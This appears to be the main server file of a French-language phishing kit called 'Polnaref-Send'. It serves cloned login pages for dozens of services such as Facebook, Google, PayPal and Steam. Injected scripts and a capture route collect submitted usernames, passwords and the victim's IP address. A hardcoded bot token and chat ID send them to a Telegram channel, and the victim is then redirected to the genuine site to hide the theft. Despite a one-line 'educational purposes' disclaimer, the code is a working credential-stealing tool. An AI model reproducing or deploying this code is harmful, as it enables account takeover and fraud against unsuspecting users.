const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const fs = require('fs-extra');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration du bot Telegram
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8418218975:AAHqp0Y1vQctQDfWQWuezLEpnmzB-UVB3MQ";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1003002461673";

// Middleware
app.use(helmet());
app.use(cors());
app.use(morgan('combined'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Fonction pour envoyer des messages à Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error('Erreur lors de l\'envoi à Telegram:', error.message);
        return { error: error.message };
    }
}

// Route pour tester Telegram
app.get('/test-telegram', async (req, res) => {
    const message = `🔄 <b>Test du bot Telegram</b>\n✅ Si vous recevez ce message, votre configuration fonctionne correctement!\n⏱ <b>Date:</b> ${new Date().toLocaleString()}`;
    
    const result = await sendToTelegram(message);
    res.json({ success: true, result });
});

// Route de secours pour login.php (redirection vers la bonne route)
app.post('/login.php', (req, res) => {
    const referer = req.get('Referer') || '';
    const siteMatch = referer.match(/\/([^\/]+)(?:\/|$)/);
    const site = siteMatch ? siteMatch[1] : 'unknown';
    
    // Rediriger vers la bonne route
    res.redirect(`/capture/${site}`);
});

// Route pour capturer les identifiants
app.post('/capture/:site', async (req, res) => {
    const site = req.params.site;
    const credentials = req.body;
    
    // Obtenir l'IP de l'utilisateur
    const userIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                   (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                   req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Inconnue';
    
    // Créer le message pour Telegram
    let message = `🔐 <b>Identifiants ${site.charAt(0).toUpperCase() + site.slice(1)} capturés!</b>\n\n`;
    
    // Ajouter les identifiants et mot de passe au message
    let hasCredentials = false;
    Object.keys(credentials).forEach(key => {
        if (credentials[key] && (key.includes('password') || key.includes('pass') || 
            key.includes('email') || key.includes('username') || key.includes('user') || 
            key.includes('login'))) {
            hasCredentials = true;
            const label = key.includes('password') || key.includes('pass') ? '🔑 Mot de passe' : 
                         key.includes('email') || key.includes('username') || key.includes('user') || key.includes('login') ? '📧 Identifiant' : 
                         '📝 ' + key.charAt(0).toUpperCase() + key.slice(1);
            message += `${label}: <code>${credentials[key]}</code>\n`;
        }
    });
    
    // Si aucun identifiant trouvé, afficher tous les champs
    if (!hasCredentials) {
        Object.keys(credentials).forEach(key => {
            if (credentials[key]) {
                const label = key.includes('password') || key.includes('pass') ? '🔑 Mot de passe' : 
                             key.includes('email') || key.includes('username') || key.includes('user') ? '📧 Identifiant' : 
                             '📝 ' + key.charAt(0).toUpperCase() + key.slice(1);
                message += `${label}: <code>${credentials[key]}</code>\n`;
            }
        });
    }
    
    message += `\n🌐 <b>Site:</b> ${site}\n`;
    message += `📍 <b>IP:</b> <code>${userIP}</code>\n`;
    message += `⏱ <b>Date:</b> ${new Date().toLocaleString()}`;
    
    // Envoyer à Telegram
    const telegramResult = await sendToTelegram(message);
    
    // Log local (sans informations sensibles)
    console.log(`✅ Identifiants capturés pour ${site} - IP: ${userIP}`);
    
    // Rediriger vers le site original (simulation)
    const redirectUrls = {
        'steam': 'https://store.steampowered.com/login/',
        'facebook': 'https://www.facebook.com/login/',
        'google': 'https://accounts.google.com/signin',
        'instagram': 'https://www.instagram.com/accounts/login/',
        'twitter': 'https://twitter.com/login',
        'discord': 'https://discord.com/login',
        'netflix': 'https://www.netflix.com/login',
        'paypal': 'https://www.paypal.com/signin',
        'github': 'https://github.com/login',
        'linkedin': 'https://www.linkedin.com/login',
        'snapchat': 'https://accounts.snapchat.com/accounts/login',
        'reddit': 'https://www.reddit.com/login',
        'microsoft': 'https://login.live.com/',
        'wordpress': 'https://wordpress.org/support/',
        'adobe': 'https://account.adobe.com/signin',
        'badoo': 'https://badoo.com/signin',
        'deviantart': 'https://www.deviantart.com/users/login',
        'dropbox': 'https://www.dropbox.com/login',
        'ebay': 'https://signin.ebay.com/',
        'fb_advanced': 'https://www.facebook.com/login/',
        'fb_messenger': 'https://www.messenger.com/login',
        'fb_security': 'https://www.facebook.com/login/',
        'gitlab': 'https://gitlab.com/users/sign_in',
        'google_new': 'https://accounts.google.com/signin',
        'google_poll': 'https://accounts.google.com/signin',
        'ig_followers': 'https://www.instagram.com/accounts/login/',
        'ig_verify': 'https://www.instagram.com/accounts/login/',
        'insta_followers': 'https://www.instagram.com/accounts/login/',
        'mediafire': 'https://www.mediafire.com/login/',
        'origin': 'https://www.origin.com/fra-fr/login',
        'pinterest': 'https://www.pinterest.com/login/',
        'playstation': 'https://www.playstation.com/fr-fr/',
        'protonmail': 'https://account.proton.me/login',
        'quora': 'https://www.quora.com/',
        'roblox': 'https://www.roblox.com/login',
        'spotify': 'https://accounts.spotify.com/fr/login',
        'stackoverflow': 'https://stackoverflow.com/users/login',
        'tiktok': 'https://www.tiktok.com/login',
        'twitch': 'https://www.twitch.tv/login',
        'vk': 'https://vk.com/login',
        'vk_poll': 'https://vk.com/login',
        'xbox': 'https://login.live.com/',
        'yahoo': 'https://login.yahoo.com/',
        'yandex': 'https://passport.yandex.com/auth'
    };
    
    const redirectUrl = redirectUrls[site] || 'https://www.google.com';
    res.redirect(redirectUrl);
});

// Servir les pages de phishing statiques
app.get('/:site', (req, res) => {
    const site = req.params.site;
    const sitesDir = path.join(__dirname, '.sites', site);
    
    // Vérifier si le dossier du site existe
    if (fs.existsSync(sitesDir)) {
        const loginHtmlPath = path.join(sitesDir, 'login.html');
        
        if (fs.existsSync(loginHtmlPath)) {
            let htmlContent = fs.readFileSync(loginHtmlPath, 'utf8');
            
            // Modifier l'action du formulaire pour pointer vers notre endpoint Node.js
            // Remplacer toutes les actions par /capture/site (avec ou sans guillemets)
            htmlContent = htmlContent.replace(
                /action="[^"]*login\.php[^"]*"/g, 
                `action="/capture/${site}"`
            );
            htmlContent = htmlContent.replace(
                /action=login\.php/g, 
                `action="/capture/${site}"`
            );
            htmlContent = htmlContent.replace(
                /action="[^"]*"/g, 
                `action="/capture/${site}"`
            );
            htmlContent = htmlContent.replace(
                /action=[^>\s]*/g, 
                `action="/capture/${site}"`
            );
            
            // Corriger les chemins des fichiers statiques (CSS, JS, images)
            // Gérer les chemins relatifs sans ./
            htmlContent = htmlContent.replace(
                /src="([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                (match, filename) => {
                    // Si le chemin ne commence pas par http ou /, ajouter le chemin du site
                    if (!filename.startsWith('http') && !filename.startsWith('/') && !filename.startsWith('./')) {
                        return `src="/${site}/${filename}"`;
                    }
                    return match;
                }
            );
            htmlContent = htmlContent.replace(
                /href="([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                (match, filename) => {
                    // Si le chemin ne commence pas par http ou /, ajouter le chemin du site
                    if (!filename.startsWith('http') && !filename.startsWith('/') && !filename.startsWith('./')) {
                        return `href="/${site}/${filename}"`;
                    }
                    return match;
                }
            );
            // Gérer les chemins avec ./
            htmlContent = htmlContent.replace(
                /src="\.\/([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                `src="/${site}/$1"`
            );
            htmlContent = htmlContent.replace(
                /href="\.\/([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                `href="/${site}/$1"`
            );
            
            // Ajouter du JavaScript pour capturer les données
            const captureScript = `
                <script>
                    document.addEventListener('DOMContentLoaded', function() {
                        const forms = document.querySelectorAll('form');
                        forms.forEach(form => {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                
                                const formData = new FormData(form);
                                const data = {};
                                for (let [key, value] of formData.entries()) {
                                    data[key] = value;
                                }
                                
                                // Vider les champs du formulaire immédiatement
                                const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[name*="username"], input[name*="email"], input[name*="password"], input[name*="user"], input[name*="login"]');
                                inputs.forEach(input => {
                                    input.value = '';
                                    input.style.backgroundColor = '#f0f0f0';
                                });
                                
                                // Désactiver le bouton de soumission
                                const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
                                if (submitBtn) {
                                    submitBtn.disabled = true;
                                    submitBtn.textContent = 'Connexion...';
                                }
                                
                                fetch('/capture/${site}', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                    },
                                    body: JSON.stringify(data)
                                }).then(() => {
                                    // Simuler un délai de traitement
                                    setTimeout(() => {
                                        // Rediriger vers le vrai site
                                        window.location.href = 'https://www.netflix.com/login';
                                    }, 1000);
                                }).catch(() => {
                                    // En cas d'erreur, rediriger quand même
                                    setTimeout(() => {
                                        window.location.href = 'https://www.netflix.com/login';
                                    }, 1000);
                                });
                            });
                        });
                    });
                </script>
            `;
            
            htmlContent = htmlContent.replace('</body>', captureScript + '</body>');
            res.send(htmlContent);
        } else {
            res.status(404).send('Page de connexion non trouvée');
        }
    } else {
        res.status(404).send('Site non trouvé');
    }
});

// Servir les fichiers statiques des sites
app.use('/:site/static', (req, res) => {
    const site = req.params.site;
    const filePath = req.path.replace(`/${site}/static`, '');
    const fullPath = path.join(__dirname, '.sites', site, filePath);
    
    if (fs.existsSync(fullPath)) {
        res.sendFile(fullPath);
    } else {
        res.status(404).send('Fichier non trouvé');
    }
});

// Servir les fichiers statiques directement (CSS, JS, images, etc.)
app.get('/:site/*', (req, res) => {
    const site = req.params.site;
    const filePath = req.path.replace(`/${site}/`, '');
    const fullPath = path.join(__dirname, '.sites', site, filePath);
    
    // Vérifier si c'est un fichier statique (CSS, JS, images, etc.)
    const staticExtensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot', '.asc', '.html'];
    const isStaticFile = staticExtensions.some(ext => filePath.endsWith(ext));
    
    if (isStaticFile && fs.existsSync(fullPath)) {
        // Définir le type MIME approprié
        const ext = path.extname(filePath);
        const mimeTypes = {
            '.css': 'text/css',
            '.js': 'application/javascript',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.svg': 'image/svg+xml',
            '.ico': 'image/x-icon',
            '.woff': 'font/woff',
            '.woff2': 'font/woff2',
            '.ttf': 'font/ttf',
            '.eot': 'application/vnd.ms-fontobject',
            '.asc': 'text/plain',
            '.html': 'text/html'
        };
        
        if (mimeTypes[ext]) {
            res.setHeader('Content-Type', mimeTypes[ext]);
        }
        
        res.sendFile(fullPath);
    } else {
        // Si ce n'est pas un fichier statique, essayer de servir la page de login
        const loginHtmlPath = path.join(__dirname, '.sites', site, 'login.html');
        if (fs.existsSync(loginHtmlPath)) {
            let htmlContent = fs.readFileSync(loginHtmlPath, 'utf8');
            
            // Modifier l'action du formulaire pour pointer vers notre endpoint Node.js
            htmlContent = htmlContent.replace(
                /action="[^"]*login\.php[^"]*"/g, 
                `action="/capture/${site}"`
            );
            htmlContent = htmlContent.replace(
                /action=login\.php/g, 
                `action="/capture/${site}"`
            );
            htmlContent = htmlContent.replace(
                /action="[^"]*"/g, 
                `action="/capture/${site}"`
            );
            htmlContent = htmlContent.replace(
                /action=[^>\s]*/g, 
                `action="/capture/${site}"`
            );
            
            // Corriger les chemins des fichiers statiques (CSS, JS, images)
            // Gérer les chemins relatifs sans ./
            htmlContent = htmlContent.replace(
                /src="([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                (match, filename) => {
                    // Si le chemin ne commence pas par http ou /, ajouter le chemin du site
                    if (!filename.startsWith('http') && !filename.startsWith('/') && !filename.startsWith('./')) {
                        return `src="/${site}/${filename}"`;
                    }
                    return match;
                }
            );
            htmlContent = htmlContent.replace(
                /href="([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                (match, filename) => {
                    // Si le chemin ne commence pas par http ou /, ajouter le chemin du site
                    if (!filename.startsWith('http') && !filename.startsWith('/') && !filename.startsWith('./')) {
                        return `href="/${site}/${filename}"`;
                    }
                    return match;
                }
            );
            // Gérer les chemins avec ./
            htmlContent = htmlContent.replace(
                /src="\.\/([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                `src="/${site}/$1"`
            );
            htmlContent = htmlContent.replace(
                /href="\.\/([^"]*\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|asc))"/g, 
                `href="/${site}/$1"`
            );
            
            // Ajouter du JavaScript pour capturer les données et vider les champs
            const captureScript = `
                <script>
                    document.addEventListener('DOMContentLoaded', function() {
                        const forms = document.querySelectorAll('form');
                        forms.forEach(form => {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                
                                const formData = new FormData(form);
                                const data = {};
                                for (let [key, value] of formData.entries()) {
                                    data[key] = value;
                                }
                                
                                // Vider les champs du formulaire immédiatement
                                const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[name*="username"], input[name*="email"], input[name*="password"], input[name*="user"], input[name*="login"]');
                                inputs.forEach(input => {
                                    input.value = '';
                                    input.style.backgroundColor = '#f0f0f0';
                                });
                                
                                // Désactiver le bouton de soumission
                                const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
                                if (submitBtn) {
                                    submitBtn.disabled = true;
                                    submitBtn.textContent = 'Connexion...';
                                }
                                
                                fetch('/capture/${site}', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                    },
                                    body: JSON.stringify(data)
                                }).then(() => {
                                    // Simuler un délai de traitement
                                    setTimeout(() => {
                                        // Rediriger vers le vrai site
                                        window.location.href = 'https://www.google.com';
                                    }, 1000);
                                }).catch(() => {
                                    // En cas d'erreur, rediriger quand même
                                    setTimeout(() => {
                                        window.location.href = 'https://www.google.com';
                                    }, 1000);
                                });
                            });
                        });
                    });
                </script>
            `;
            
            htmlContent = htmlContent.replace('</body>', captureScript + '</body>');
            res.send(htmlContent);
        } else {
            res.status(404).send('Site non trouvé');
        }
    }
});

// Servir les fichiers HTML des sites directement (pour compatibilité)
app.get('/:site/login.html', (req, res) => {
    const site = req.params.site;
    const sitesDir = path.join(__dirname, '.sites', site);
    const loginHtmlPath = path.join(sitesDir, 'login.html');
    
    if (fs.existsSync(loginHtmlPath)) {
        let htmlContent = fs.readFileSync(loginHtmlPath, 'utf8');
        
        // Modifier l'action du formulaire pour pointer vers notre endpoint Node.js
        htmlContent = htmlContent.replace(
            /action="[^"]*login\.php[^"]*"/g, 
            `action="/capture/${site}"`
        );
        htmlContent = htmlContent.replace(
            /action=login\.php/g, 
            `action="/capture/${site}"`
        );
        htmlContent = htmlContent.replace(
            /action="[^"]*"/g, 
            `action="/capture/${site}"`
        );
        htmlContent = htmlContent.replace(
            /action=[^>\s]*/g, 
            `action="/capture/${site}"`
        );
        
        // Ajouter du JavaScript pour capturer les données et vider les champs
        const captureScript = `
            <script>
                document.addEventListener('DOMContentLoaded', function() {
                    const forms = document.querySelectorAll('form');
                    forms.forEach(form => {
                        form.addEventListener('submit', function(e) {
                            e.preventDefault();
                            
                            const formData = new FormData(form);
                            const data = {};
                            for (let [key, value] of formData.entries()) {
                                data[key] = value;
                            }
                            
                            // Vider les champs du formulaire immédiatement
                            const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[name*="username"], input[name*="email"], input[name*="password"], input[name*="user"], input[name*="login"]');
                            inputs.forEach(input => {
                                input.value = '';
                                input.style.backgroundColor = '#f0f0f0';
                            });
                            
                            // Désactiver le bouton de soumission
                            const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
                            if (submitBtn) {
                                submitBtn.disabled = true;
                                submitBtn.textContent = 'Connexion...';
                            }
                            
                            fetch('/capture/${site}', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify(data)
                            }).then(() => {
                                // Simuler un délai de traitement
                                setTimeout(() => {
                                    // Rediriger vers le vrai site
                                    window.location.href = 'https://www.google.com';
                                }, 1000);
                            }).catch(() => {
                                // En cas d'erreur, rediriger quand même
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 1000);
                            });
                        });
                    });
                });
            </script>
        `;
        
        htmlContent = htmlContent.replace('</body>', captureScript + '</body>');
        res.send(htmlContent);
    } else {
        res.status(404).send('Page de connexion non trouvée');
    }
});

// Route racine - afficher la liste des sites disponibles
app.get('/', (req, res) => {
    const sitesDir = path.join(__dirname, '.sites');
    const sites = fs.readdirSync(sitesDir, { withFileTypes: true })
        .filter(dirent => dirent.isDirectory())
        .map(dirent => dirent.name)
        .filter(site => !['telegram_bot.php', 'ip.php'].includes(site));
    
    let html = `
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Polnaref-Send - Node.js</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #1a1a1a; color: #fff; }
            .container { max-width: 800px; margin: 0 auto; }
            .site-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 30px; }
            .site-card { background: #2a2a2a; padding: 20px; border-radius: 8px; text-align: center; transition: transform 0.3s; }
            .site-card:hover { transform: translateY(-5px); background: #3a3a3a; }
            .site-card a { color: #4CAF50; text-decoration: none; font-weight: bold; }
            .header { text-align: center; margin-bottom: 30px; }
            .status { background: #4CAF50; color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎣 Polnaref-Send - Node.js Edition</h1>
                <div class="status">✅ Serveur actif - Version Node.js</div>
            </div>
            <h2>Sites disponibles (${sites.length})</h2>
            <div class="site-list">
    `;
    
    sites.forEach(site => {
        html += `
            <div class="site-card">
                <h3>${site.charAt(0).toUpperCase() + site.slice(1)}</h3>
                <a href="/${site}">Accéder au site</a>
            </div>
        `;
    });
    
    html += `
            </div>
            <div style="margin-top: 40px; text-align: center;">
                <p><a href="/test-telegram" style="color: #2196F3;">🧪 Tester Telegram</a></p>
                <p style="color: #666; font-size: 12px;">⚠️ À des fins éducatives uniquement</p>
            </div>
        </div>
    </body>
    </html>
    `;
    
    res.send(html);
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`🚀 Serveur Polnaref-Send démarré sur le port ${PORT}`);
    console.log(`📱 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Configuré' : '❌ Non configuré'}`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log(`🌐 Accédez à: http://localhost:${PORT}`);
});

module.exports = { sendToTelegram };
